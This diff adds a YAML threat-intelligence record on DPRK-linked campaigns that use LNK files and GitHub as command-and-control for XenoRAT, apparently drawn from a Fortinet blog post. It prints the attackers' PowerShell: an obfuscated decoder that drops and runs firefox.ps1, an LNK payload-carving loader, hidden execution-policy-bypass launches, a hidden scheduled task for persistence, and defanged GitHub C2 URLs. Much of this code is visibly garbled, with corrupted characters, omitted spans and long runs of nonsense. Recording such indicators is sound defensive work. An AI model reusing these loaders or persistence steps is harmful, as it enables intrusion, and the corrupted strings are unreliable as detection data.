@@ -1,0 +1,99 @@
+title: DPRK-Related Campaigns with LNK and GitHub C2
+description: DPRK actors use LNK files and GitHub as Command and Control (C2) infrastructure
+  to evade detection and maintain persistence.
+attribution: ''
+malware_families:
+- XenoRAT
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - wscript.exe
+  command_lines:
+  - "$VIUSBvejbawf = \"142 99 115 37 136 66 90 101 94 165 98 106 103 37 165 100 110\
+    \ 123 107 94 74 110 161 83 (omit) 87 107 103 151\";$Length = $VIUSBvejbawf.Length;$CLOIISFYSystem.Collections.ArrayList;[string]\
+    \ $date = $null;$m = @;for($k = @; $k -lt $Length$VIUSBvejbawf[$k];if($VIUSBvejbawf[$k]\
+    \ -eq \" \"){[void]$CLOIISfgiojvosef235sdb.Add($null);continue; }}$Apkengsidefg\
+    \ = \"Kdt& %bgek\";[Byte[]]$pw =[System.Text.Encoding]::UTF8.GetBytes(\"$Apkengsidefg\"\
+    );$pw_Length = $Apkengsidefg.Length;$MFibvfaibfeg2345fbdfg = New-Object System.Byte[]({=\
+    \ @;for($i = @; $i -lt $CLOIISfgiojvosef235sdb.Count; $i++){$pw_num = $pw[$j]\
+    \ + 103;$CLOIISFgiojvosef235sdb[$i]){$MFibvfaibfeg2345fbdfg[$i] = $pw_num -$CLOIISFgiojvosef235sg$pw_Length){$j\
+    \ = @;}}$aqqpvm = [System.Text.Encoding]::UTF8.GetString($MFibvfaibfeg234\"$env:appdata\f\
+    irefox.ps1\";$qqpvm|Out-File -FilePath $fgfw98IHGVFfeg;powershell -wilBypass $fgfw98IHGVfeg;"
+  - $j3 = Get-Location; $Ygh = Join-Path $j3 ('Technical PapChain.pdf.1nk'); $KQD
+    = $env:TEMP; if (-not(Test-Path $gh)) { $Nx2 = Get-ChildItem $|ERrOraCTIoN SILeNtLyConTinuE
+    | where-ObJEct { $_.nAmE -eQ 'Technical Paper for Creata ChasoRt-obJECt 1ASTWRATEtIME
+    -DEsCendInG | Select-Object -FIrsT 1; If ($Nx2) { $Ygh = $N|else { exit; } };
+    function pl { param($nW, $3jB, $EG, $zNo) $LT = New-Object B$Nm = [System.IO.File]::OpenRead($Ygh);
+    $Nm.Seek($nW, [System.IO.SeekOrigin]::BEGIN);0, $jB); $Nm.Close(); FOR ($Ci =
+    @; $Ci -lt $3jB; $Ci++) { SLT[$Ci] = $LT[}; Set-Content $zN@ $LT -Encoding Byte;
+    }; $jp = Join-Path $KQD ('Technical Paper forChain.pdf'); pl 8192 1965784 157
+    $jp; & $jp; $IV = Join-Path $KQD ([System.IO.Path]::GetR'.psl'); pl 1973976 7300
+    100 $IV; powershell -noprofile -windowstyle hidden -executionpol$3V; Remove-Item
+    -Path $IV -Force;
+  - powershell -WindowStyle Hidden -nop -NonInteractive -NgExecutionPolicy Bypass
+    -Command "& {$abc = Join-Path ($env:AppData) \"chrome.ps1\"; & $abc;}"
+  powershell:
+  - $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"' + $vbsFilePath
+    + '"'); $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
+    -RepetitionInterval (New-TimeSpan -Minutes 30); $settings = New-ScheduledTaskSettingsSet
+    -Hidden; Register-ScheduledTask -TaskName "Technical Paper for Creata Chain Task
+    S-1-12-3-1231241245BVSKLERh-SD234GHSI56" -Action $action -Trigger $trigger -Settings
+    $settings
+  - function wi {  SygxaquachaBebl = @(("(@)(2)" -F "vmune',t"), ([string]::Format((a)(2)(2)(2)","vi,
+    UG F unse, ), S Saind alsinkec Totharareap) [<(Sec{int 5,146e g andsc-1e38) ([
+    char] (65 (he- 65174200 a5 4057 amdc Aeszay([eha (57 (5 $7- )37}(LcharJsey, Com'=rret
+    = 13ty )y, CEINEIGIET b or e  ). 0JointLogentTothararr g (s 1t 14 3444 g anater1ese)(Lcha
+    (o {(her 4312y Sy pe1serhCferges7 amisc-Lerza)([char) o7=C(be- 5713 S0 el ehar
+    eI, ({01 < 1o ) 8ofocharisray O {8c=[in 155 scgees-mscTese)([car] (5 (5c-25072)
+    520 el g 1ee o e o e T T e R T e so 33y (oteog] rarman (03101 e By L33 ol kLo
+    ee N kot NN S it N i gI, 0 a1 ) s OO I o ee
+  - function pl { param($nW, $3jB, $EG, $zNo) $LT = New-Object B$Nm = [System.IO.File]::OpenRead($Ygh);
+    $Nm.Seek($nW, [System.IO.SeekOrigin]::BEGIN);0, $jB); $Nm.Close(); FOR ($Ci =
+    @; $Ci -lt $3jB; $Ci++) { SLT[$Ci] = $LT[}; Set-Content $zN@ $LT -Encoding Byte;
+    }
+  - Ct 1ASTWRATEtIME -DEsCendInG | Select-Object -FIrsT 1; If ($Nx2) { $Ygh = $N|else
+    { exit; } }; function pl { param($nW, $3jB, $EG, $zNo) $LT = New-Object B$Nm =
+    [System.IO.File]::OpenRead($Ygh); $Nm.Seek($nW, [System.IO.SeekOrigin]::BEGIN);0,
+    $jB); $Nm.Close(); FOR ($Ci = @; $Ci -LT $3jB; $Ci++) { SLT[$Ci] = $LT[}; Set-Content
+    $zN@ $LT -Encoding Byte; }; $jp = Join-Path $KQD ('Technical Paper forChain.pdf');
+    pl 8192 1965784 157 $jp; & $jp; $IV = Join-Path $KQD ([System.IO.Path]::GetR'.psl');
+    pl 1973976 7300 100 $IV; powershell -noprofile -windowstyle hidden -executionpol$3V;
+    Remove-Item -Path $IV -Force;
+  - function wi { SygxaquachaBebl = @(("(@)(2)" -F "vmune',t"), ([string]::Format((a)(2)(2)(2)","vi,
+    UG F unse, ), S Saind alsinkec Totharareap) [<(Sec{int 5,146e g andsc-1e38) ([
+    char] (65 (he- 65174200 a5 4057 amdc Aeszay([eha (57 (5 $7- )37}(LcharJsey, Com'=rret
+    = 13ty )y, CEINEIGIET b or e  ). 0JointLogentTothararr g (s 1t 14 3444 g anater1ese)(Lcha
+    (o {(her 4312y Sy pe1serhCferges7 amisc-Lerza)([char) o7=C(be- 5713 S0 el ehar
+    eI, ({01 < 1o ) 8ofocharisray O {8c=[in 155 scgees-mscTese)([car] (5 (5c-25072)
+    520 el g 1ee o e o e T T e R T e so 33y (oteog] rarman (03101 e By L33 ol kLo
+    ee N kot NN S it N i gI, 0 a1 ) s OO I o ee b e sy b i 185 5 s anibc syl (-5 %RN
+    R e e S TChuinC e ey (S (sen i 15 Chegeasandse A0 L1 ((he-Gher Y eR T e o e R
+    e e010, SCTobnC ot 1oty O (5= 1535 (3 -ges.andsc-Leam ([ (v ((30-85712) )R e i
+    st e R eTSk 1855 b g anieTepmyC[eho (v (B g5y o3 ebtasFCh g b AesisyAok e iR e
+    el skt BTFeher k) O] TS GV 3] 1 T a1 oo e e e (e ot1035, 4 it e ey (Lt sroema
+    (Y11 a3 L o (0) 1)L0 D8 o s Totharatray (XS i1 4 e getsanti 1es0) [char1 (0 (311375500
+    et pe-andbe Lerzz) ([ehar] 07 (5 371720 k(L char DY (o 1o1 0T o g0, O X3 25 (O]
+    DL, g olnCprdcest,ket 1 " orean (st sn dsioaiiesnt xmm omeAT i i ST T et Fame
+    T sturm $fleer 3 Sheud) CodETd
+  scripts:
+  - '{[Text.Encoding]::UTF8.GetString(...)})'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - powershell.exe -> hxxps://api[.]github[.]com/repos/motoralis/singled/contents/kcca/technik
+  - powershell.exe -> hxxps://raw[.]githubusercontent[.]com/motoralis/singled/main/kcca/paper[.]jim
+  - wscript.exe -> hxxps://api[.]github[.]com/repos/motoralisaf0309aa38d067373c54b2a7774a32f68ab72cb2dbf5aed74ac784b079830184
+  - powershell.exe -> hxxps://api[.]github[.]com/repos/motoralis/singled/contents/jjyun/network/<Date>_<Time>-<IP_Address>-Real.log
+  file_activity: []
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors: []
+reference: https://www.fortinet.com/blog/threat-research/dprk-related-campaigns-with-lnk-and-github-c2
+date_of_publication: April 02, 2026
+file_creation_date: May 09, 2026
